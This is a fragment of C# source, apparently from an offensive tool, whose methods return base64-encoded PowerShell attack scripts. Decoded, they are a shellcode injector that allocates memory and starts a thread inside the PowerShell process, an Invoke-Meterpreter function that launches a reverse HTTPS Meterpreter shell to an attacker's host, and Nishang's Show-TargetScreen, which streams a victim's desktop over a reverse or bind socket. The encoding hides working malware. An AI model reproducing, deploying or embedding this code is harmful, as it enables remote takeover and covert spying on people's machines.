IEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkNCiAgICAgICAgJFZpcnR1YWxBbGxvYyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NBZGRyLCAkVmlydHVhbEFsbG9jRGVsZWdhdGUpDQogICAgICAgICRWaXJ0dWFsRnJlZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxGcmVlDQogICAgICAgICRWaXJ0dWFsRnJlZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVWludDMyXSwgW1VJbnQzMl0pIChbQm9vbF0pDQogICAgICAgICRWaXJ0dWFsRnJlZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsRnJlZUFkZHIsICRWaXJ0dWFsRnJlZURlbGVnYXRlKQ0KICAgICAgICAkQ3JlYXRlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ3JlYXRlVGhyZWFkDQogICAgICAgICRDcmVhdGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pDQogICAgICAgICRDcmVhdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlVGhyZWFkQWRkciwgJENyZWF0ZVRocmVhZERlbGVnYXRlKQ0KICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdhaXRGb3JTaW5nbGVPYmplY3QNCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3REZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludDMyXSkgKFtJbnRdKQ0KICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXYWl0Rm9yU2luZ2xlT2JqZWN0QWRkciwgJFdhaXRGb3JTaW5nbGVPYmplY3REZWxlZ2F0ZSkNCiAgICAgICAgDQogICAgICAgIFdyaXRlLVZlcmJvc2UgIkluamVjdGluZyBzaGVsbGNvZGUgaW50byBQb3dlclNoZWxsIg0KICAgICAgICANCiAgICAgICAgaWYgKCAkRm9yY2UgLW9yICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggJ0RvIHlvdSB3aXNoIHRvIGNhcnJ5IG91dCB5b3VyIGV2aWwgcGxhbnM/JywNCiAgICAgICAgICAgICAgICAgIkluamVjdGluZyBzaGVsbGNvZGUgaW50byB0aGUgcnVubmluZyBQb3dlclNoZWxsIHByb2Nlc3MhIiApICkNCiAgICAgICAgew0KICAgICAgICAgICAgSW5qZWN0LUxvY2FsU2hlbGxjb2RlDQogICAgICAgIH0NCiAgICB9ICAgDQp9"));
            return PSInvoke_Shellcode;
        }
        public static string Invoke_Meterpreter()
        {
            string PSInvoke_Invoke_Meterpreter = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"ZnVuY3Rpb24gSW52b2tlLU1ldGVycHJldGVyDQp7DQoJcGFyYW0gKA0KCSAgIFtzdHJpbmddJExIb3N0ICA9ICQodGhyb3cgIi1MSG9zdCBpcyByZXF1aXJlZC4iKSwNCgkgICBbc3RyaW5nXSRMUG9ydCA9ICQodGhyb3cgIi1MUG9ydCBpcyByZXF1aXJlZC4iKQ0KCSkNCg0KCVdyaXRlLUhvc3QgIiINCglXcml0ZS1Ib3N0ICJPdXIgTWV0ZXJwcmV0ZXIgTGlzdGVuZXIgSVA6ICIgLU5vTmV3bGluZSANCglXcml0ZS1Ib3N0ICRMSG9zdCANCglXcml0ZS1Ib3N0ICIiDQoJV3JpdGUtSG9zdCAiIg0KCVdyaXRlLUhvc3QgIk91ciBNZXRlcnByZXRlciBMaXN0ZW5lciBQb3J0OiAiIC1Ob05ld2xpbmUgDQoJV3JpdGUtSG9zdCAkTFBvcnQgDQoJV3JpdGUtSG9zdCAiIg0KCVdyaXRlLUhvc3QgIkxldCdzIHNldHVwIGEgU2hlbGwgOikiDQoJSW52b2tlLVNoZWxsY29kZSAtUGF5bG9hZCB3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMgLUxob3N0ICRMSG9zdCAtTHBvcnQgJExQb3J0IC1Gb3JjZQ0KfQ=="));
            return PSInvoke_Invoke_Meterpreter;
        }
        public static string Show_TargetScreen()
        {
            string PSInvoke_Show_TargetScreen = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"DQpmdW5jdGlvbiBTaG93LVRhcmdldFNjcmVlbg0Kew0KPCMNCi5TWU5PUFNJUw0KTmlzaGFuZyBzY3JpcHQgd2hpY2ggY2FuIGJlIHVzZWQgZm9yIHN0cmVhbWluZyBhIHRhcmdldCdzIGRlc2t0b3AgdXNpbmcgTUpQRUcuDQoNCi5ERVNDUklQVElPTg0KVGhpcyBzY3JpcHQgdXNlcyBNSlBFRyB0byBzdHJlYW0gYSB0YXJnZXQncyBkZXNrdG9wIGluIHJlYWwgdGltZS4gSXQgaXMgYWJsZSB0byBjb25uZWN0IHRvIGEgc3RhbmRhcmQgbmV0Y2F0IGxpc3RlbmluZw0Kb24gYSBwb3J0IHdoZW4gdXNpbmcgdGhlIC1SZXZlcnNlIHN3aXRjaC4gQWxzbywgYSBzdGFuZGFyZCBuZXRjYXQgY2FuIGNvbm5lY3QgdG8gdGhpcyBzY3JpcHQgQmluZCB0byBhIHNwZWNpZmljIHBvcnQuDQoNCkEgbmV0Y2F0IGxpc3RlbmVyIHdoaWNoIHJlbGF5cyBjb25uZWN0aW9uIHRvIGEgbG9jYWwgcG9ydCBjb3VsZCBiZSB1c2VkIGFzIGxpc3RlbmVyLiBBIGJyb3dzZXIgd2hpY2ggc3VwcG9ydHMgTUpQRUcgKEZpcmVmb3gpIA0Kc2hvdWxkIHRoZW4gYmUgcG9pbnRlZCB0byB0aGUgbG9jYWwgcG9ydCB0byBzZWUgdGhlIHJlbW90ZSBkZXNrdG9wLg0KDQpUaGUgc2NyaXB0IHNob3VsZCBiZSB1c2VkIHdpdGggQ2xpZW50IFNpZGUgQXR0YWNrcy4gDQoNCi5QQVJBTUVURVIgSVBBZGRyZXNzDQpUaGUgSVAgYWRkcmVzcyB0byBjb25uZWN0IHRvIHdoZW4gdXNpbmcgdGhlIC1SZXZlcnNlIHN3aXRjaC4NCg0KLlBBUkFNRVRFUiBQb3J0DQpUaGUgcG9ydCB0byBjb25uZWN0IHRvIHdoZW4gdXNpbmcgdGhlIC1SZXZlcnNlIHN3aXRjaC4gV2hlbiB1c2luZyAtQmluZCBpdCBpcyB0aGUgcG9ydCBvbiB3aGljaCB0aGlzIHNjcmlwdCBsaXN0ZW5zLg0KDQouRVhBTVBMRQ0KUFMgPiBTaG93LVRhcmdldFNjcmVlbiAtUmV2ZXJzZSAtSVBBZGRyZXNzIDE5Mi4xNjguMjMwMS4xIC1Qb3J0IDQ0Mw0KDQpBYm92ZSBzaG93cyBhbiBleGFtcGxlIG9mIGFhIHJldmVyc2UgY29ubmVjdGlvbi4gQSBuZXRjYXQvcG93ZXJjYXQgbGlzdGVuZXIgbXVzdCBiZSBsaXN0ZW5pbmcgb24gDQp0aGUgZ2l2ZW4gSVAgYW5kIHBvcnQuIA0KDQouRVhBTVBMRQ0KUFMgPiBPdXQtV29yZCAtUGF5bG9hZFVSTCAiaHR0cDovLzE5Mi4xNjguMS42L1Nob3ctVGFyZ2V0U2NyZWVuLnBzMSIgLUFyZ3VtZW50cyAiU2hvdy1UYXJnZXRTY3JlZW4gLVJldmVyc2UgLUlQQWRkcmVzcyAxOTIuMTY4LjEuNiAtUG9ydCA0NDMiDQoNCkFib3ZlIHNob3dzIGFuIGV4YW1wbGUgdXNpbmcgdGhlIHNjcmlwdCBpbiBhIGNsaWVudCBzaWRlIGF0dGFjay4gDQoNCi5FWEFNUExFDQpQUyA+IFNob3ctVGFyZ2V0U2NyZWVuIC1CaW5kIC1Qb3J0IDEyMzQNCg0KQWJvdmUgc2hvd3MgYW4gZXhhbXBsZSBvZiBiaW5kIG1vZGUuIFBvaW50IEZpcmVmb3ggdG8gdGhlIElQQWRkcmVzcyBvZiB0aGUgdGFyZ2V0IGFuZCBnaXZlbiBwb3J0IHRvIHNlZSB1c2VyJ3MgRGVza3RvcC4NCg0KDQouTElOSw0KaHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxNS8xMi9zdHJlYW0tdGFyZ2V0cy1kZXNrdG9wLXVzaW5nLW1qcGVnLWFuZC1wb3dlcnNoZWxsLmh0bWwNCmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nDQojPiAgIA0KICAgIA0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lPSJyZXZlcnNlIildIFBhcmFtKA0KDQogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZT0icmV2ZXJzZSIpXQ0KICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJiaW5kIildDQogICAgICAgIFtTdHJpbmddDQogICAgICAgICRJUEFkZHJlc3MsDQoNCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lPSJyZXZlcnNlIildDQogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZT0iYmluZCIpXQ0KICAgICAgICBbSW50XQ0KICAgICAgICAkUG9ydCwNCg0KICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWU9InJldmVyc2UiKV0NCiAgICAgICAgW1N3aXRjaF0NCiAgICAgICAgJFJldmVyc2UsDQoNCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lPSJiaW5kIildDQogICAgICAgIFtTd2l0Y2hdDQogICAgICAgICRCaW5kDQoNCiAgICApDQogICAgDQogICAgd2hpbGUgKCR0cnVlKQ0KICAgIHsNCiAgICAgICAgdHJ5DQogICAgICAgIHsNCiAgICAgICAgICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCiAgICAgICAgICAgIFtTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtXSAkTWVtb3J5U3RyZWFtID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtDQoNCiAgICAgICAgICAgICNDb25uZWN0IGJhY2sgaWYgdGhlIHJldmVyc2Ugc3dpdGNoIGlzIHVzZWQuDQogICAgICAgICAgICBpZiAoJFJldmVyc2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJHNvY2tldCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldCAoW1N5c3RlbS5OZXQuU29ja2V0cy5BZGRyZXNzRmFtaWx5XTo6SW50ZXJOZXR3b3JrLCBbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldFR5cGVdOjpTdHJlYW0sIFtTeXN0ZW0uTmV0LlNvY2tldHMuUHJvdG9jb2xUeXBlXTo6VGNwKQ0KICAgICAgICAgICAgICAgICRzb2NrZXQuQ29ubmVjdCgkSVBBZGRyZXNzLCRQb3J0KQ0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNvbm5lY3RlZCB0byAkSVBBZGRyZXNzIg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAjQmluZCB0byB0aGUgcHJvdmlkZWQgcG9ydCBpZiBCaW5kIHN3aXRjaCBpcyB1c2VkLg0KICAgICAgICAgICAgaWYgKCRCaW5kKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICNTdGFydCBhIGxpc3RlbmVyDQogICAgICAgICAgICAgICAgJGVuZHBvaW50ID0gbmV3LW9iamVjdCBTeXN0ZW0uTmV0LklQRW5kUG9pbnQgKFtzeXN0ZW0ubmV0LmlwYWRkcmVzc106OmFueSwgJFBvcnQpDQogICAgICAgICAgICAgICAgJHNlcnZlciA9IG5ldy1vYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcExpc3RlbmVyICRlbmRwb2ludA0KICAgICAgICAgICAgICAgICRzZXJ2ZXIuU3RhcnQoKQ0KICAgICAgICAgICAgICAgICRidWZmZXIgPSBOZXctT2JqZWN0IGJ5dGVbXSAxMDI0DQogICAgICAgICAgICAgICAgJHNvY2tldCA9ICRzZXJ2ZXIuQWNjZXB0U29ja2V0KCkNCiAgICAgICAgDQogICAgICAgICAgICB9IA0KICAgIA0KICAgICAgICANCiAgICAgICAgICAgICNodHRwczovL2V2aWxldmVsaXZlLndvcmRwcmVzcy5jb20vMjAwOS8wMy8wOS93ZWItc2VydmVyLXdyaXR0ZW4taW4tcG93ZXJzaGVsbC8NCiAgICAgICAgICAgIGZ1bmN0aW9uIFNlbmRSZXNwb25zZSgkc29jaywgJHN0cmluZykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoJHNvY2suQ29ubmVjdGVkKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgJGJ5dGVzU2VudCA9ICRzb2NrLlNlbmQoDQogICAgICAgICAgICAgICAgICAgICRzdHJpbmcpDQogICAgICAgICAgICAgICAgICAgIGlmICggJGJ5dGVzU2VudCAtZXEgLTEgKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlNlbmQgZmFpbGVkIHRvICIgKyAkc29jay5SZW1vdGVFbmRQb2ludA0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBmdW5jdGlvbiBTZW5kU3RyUmVzcG9uc2UoJHNvY2ssICRzdHJpbmcpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKCRzb2NrLkNvbm5lY3RlZCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICRieXRlc1NlbnQgPSAkc29jay5TZW5kKA0KICAgICAgICAgICAgICAgICAgICBbdGV4dC5FbmNvZGluZ106OkFzY2lpLkdldEJ5dGVzKCRzdHJpbmcpKQ0KICAgICAgICAgICAgICAgICAgICBpZiAoICRieXRlc1NlbnQgLWVxIC0xICkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICgiU2VuZCBmYWlsZWQgdG8gIiArICRzb2NrLlJlbW90ZUVuZFBvaW50KQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgI0NyZWF0ZSB0aGUgaGVhZGVyIGZvciBNSlBFRyBzdHJlYW0NCiAgICAgICAgICAgIGZ1bmN0aW9uIFNlbmRIZWFkZXIoDQogICAgICAgICAgICAgICAgW25ldC5zb2NrZXRzLnNvY2tldF0gJHNvY2ssDQogICAgICAgICAgICAgICAgJGxlbmd0aCwNCiAgICAgICAgICAgICAgICAkc3RhdHVzQ29kZSA9ICIyMDAgT0siLA0KICAgICAgICAgICAgICAgICRtaW1lSGVhZGVyPSJ0ZXh0L2h0bWwiLA0KICAgICAgICAgICAgICAgICRodHRwVmVyc2lvbj0iSFRUUC8xLjEiDQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICRyZXNwb25zZSA9ICJIVFRQLzEuMSAkc3RhdHVzQ29kZWByYG4iICsNCiAgICAgICAgICAgICAgICAiQ29udGVudC1UeXBlOiBtdWx0aXBhcnQveC1taXhlZC1yZXBsYWNlOyBib3VuZGFyeT0tLWJvdW5kYXJ5YHJgbmBuIg0KICAgICAgICAgICAgICAgIFNlbmRTdHJSZXNwb25zZSAkc29jayAkcmVzcG9uc2UNCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJIZWFkZXIgc2VudCB0byAkSVBBZGRyZXNzIg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAjU2VuZCB0aGUgaGVhZGVyDQogICAgICAgICAgICBTZW5kSGVhZGVyICRzb2NrZXQNCg0KICAgICAgICAgICAgd2hpbGUgKCRUcnVlKQ0KICAgICAgICAgICAgew0KDQogICAgICAgICAgICAgICAgJGIgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLkJpdG1hcChbU3lzdGVtLldpbmRvd3MuRm9ybXMuU2NyZWVuXTo6UHJpbWFyeVNjcmVlbi5Cb3VuZHMuV2lkdGgsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5TY3JlZW5dOjpQcmltYXJ5U2NyZWVuLkJvdW5kcy5IZWlnaHQpDQogICAgICAgICAgICAgICAgJGcgPSBbU3lzdGVtLkRyYXdpbmcuR3JhcGhpY3NdOjpGcm9tSW1hZ2UoJGIpDQogICAgICAgICAgICAgICAgJGcuQ29weUZyb21TY3JlZW4oKE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuUG9pbnQoMCwwKSksIChOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlBvaW50KDAsMCkpLCAkYi5TaXplKQ0KICAgICAgICAgICAgICAgICRnLkRpc3Bvc2UoKQ0KICAgICAgICAgICAgICAgICRNZW1vcnlTdHJlYW0uU2V0TGVuZ3RoKDApDQogICAgICAgICAgICAgICAgJGIuU2F2ZSgkTWVtb3J5U3RyZWFtLCAoW3N5c3RlbS5kcmF3aW5nLmltYWdpbmcuaW1hZ2Vmb3JtYXRdOjpqcGVnKSkNCiAgICAgICAgICAgICAgICAkYi5EaXNwb3NlKCkNCiAgICAgICAgICAgICAgICAkbGVuZ3RoID0gJE1lbW9yeVN0cmVhbS5MZW5ndGgNCiAgICAgICAgICAgICAgICBbYnl0ZVtdXSAkQnl0ZXMgPSAkTWVtb3J5U3RyZWFtLlRvQXJyYXkoKQ0KICAgICAgICANCiAgICAgICAgICAgICAgICAjU2V0IHRoZSBib3VuZGFyeSBmb3IgdGhlIG11bHRpLXBhcnQgcmVxdWVzdA0KICAgICAgICAgICAgICAgICRzdHIgPSAiYG5gbi0tYm91bmRhcnlgbiIgKw0KICAgICAgICAgICAgICAgICJDb250ZW50LVR5cGU6IGltYWdlL2pwZWdgbiIgKw0KICAgICAgICAgICAgICAgICJDb250ZW50LUxlbmd0aDogJGxlbmd0aGBuYG4iDQogICAgICAgIA0KICAgICAgICAgICAgICAgICNTZW5kIFJlcXVlc3RzDQogICAgICAgICAgICAgICAgU2VuZFN0clJlc3BvbnNlICRzb2NrZXQgJHN0cg0KICAgICAgICAgICAgICAgIFNlbmRSZXNwb25zZSAkc29ja2V0ICRCeXRlcw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJE1lbW9yeVN0cmVhbS5DbG9zZSgpDQogICAgICAgIH0NCiAgICAgICAgY2F0Y2gNCiAgICAgICAgew0KICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiU29tZXRoaW5nIHdlbnQgd3JvbmchIENoZWNrIGlmIHRoZSBzZXJ2ZXIgaXMgcmVhY2hhYmxlIGFuZCB5b3UgYXJlIHVzaW5nIHRoZSBjb3JyZWN0IHBvcnQuIiANCiAgICAgICAgICAgIFdyaXRlLUVycm9yICRfDQogICAgICAgIH0NCiAgICB9DQp9DQo="));
            return PSInvoke_Show_TargetScreen;
        }
    }
}
